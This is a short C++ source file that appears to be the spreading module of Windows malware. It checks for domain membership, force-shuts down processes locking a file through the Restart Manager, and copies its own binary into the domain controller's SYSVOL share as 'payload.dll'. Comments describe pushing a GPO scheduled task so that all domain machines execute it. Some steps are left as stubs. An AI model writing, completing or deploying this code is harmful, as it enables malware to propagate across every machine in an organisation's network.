#include "spread.h"
#include <windows.h>
#include <lm.h>

bool is_domain_joined() {
    NETSETUP_JOIN_STATUS status;
    LPWSTR name = nullptr;
    NetGetJoinInformation(NULL, &name, &status);
    if (name) NetApiBufferFree(name);
    return status == NetSetupDomainName;
}

void unlock_file_via_restart_manager(const wchar_t* path) {
    DWORD session; WCHAR key[CCH_RM_SESSION_KEY + 1] = {};
    if (RmStartSession(&session, 0, key) != ERROR_SUCCESS) return;

    RmRegisterResources(session, 1, &path, 0, NULL, 0, NULL);

    DWORD needed = 10, got = 10;
    RM_PROCESS_INFO procs[10];
    RmGetList(session, &needed, &got, procs, NULL);
    RmShutdown(session, RmForceShutdown, NULL);
    RmEndSession(session);
}

void spread_via_gpo() {
    if (!is_domain_joined()) return;

    // Find SYSVOL
    wchar_t sysvol[MAX_PATH] = {};
    DWORD size = MAX_PATH;
    // Real impl uses NetGetDCName + path construction
    // Simplified:
    GetEnvironmentVariableW(L"LOGONSERVER", sysvol, MAX_PATH);
    wcscat_s(sysvol, L"\\SYSVOL");

    // Copy payload
    wchar_t dest[MAX_PATH];
    swprintf_s(dest, L"%s\\payload.dll", sysvol);
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    CopyFileW(self, dest, FALSE);

    // Create scheduled task via GPO
    // Real impl writes XML GPO to SYSVOL/Policies/
    // Replicates to all DCs → all domain machines execute on GPO refresh
}
